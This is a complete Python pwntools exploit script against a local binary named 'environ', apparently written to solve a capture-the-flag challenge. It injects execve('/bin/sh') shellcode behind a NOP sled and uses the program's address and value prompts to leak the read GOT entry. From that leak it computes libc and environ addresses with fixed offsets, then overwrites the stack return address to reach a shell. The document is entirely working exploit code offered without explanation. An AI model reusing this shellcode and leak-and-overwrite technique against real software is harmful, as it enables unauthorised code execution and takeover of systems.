from pwn import *

p = process("./environ")

context.arch='x86_64'


shellcode="\x90"*200
shellcode+=asm(shellcraft.execve("/bin/sh")) 
p.sendline(shellcode)


elf=ELF("./environ")
buf_ptr = elf.symbols['buf_ptr']
read_got = elf.got['read']

print p.sendlineafter("Addr: ", str(buf_ptr))
print p.sendlineafter("Value: ", str(read_got))
print p.recvuntil("buf: ")

read_libc = u64(p.recv(6).ljust(8, "\x00"))
libc_base = read_libc-0xf7250
libc_environ = libc_base+0x3c6f38

print hex(read_libc)
print hex(libc_base)
print hex(libc_environ)

print p.sendlineafter("Addr: ", str(buf_ptr))
print p.sendlineafter("Value: ", str(libc_environ))
print p.recvuntil("buf: ")


stack_environ = u64(p.recv(6).ljust(8,"\x00"))
pause()
stack_ret = stack_environ - 0xf0
print hex(stack_environ)
print hex(stack_ret)

stack_shellcode = stack_environ-0x508
print p.sendlineafter("Addr: ", str(stack_ret))
print p.sendlineafter("Value: ", str(stack_shellcode))
print hex(stack_shellcode)

for i in range(0,7):
    print p.sendlineafter("Addr: ", str(stack_ret))
    p.sendlineafter("Value: ", str(stack_shellcode))

p.interactive()
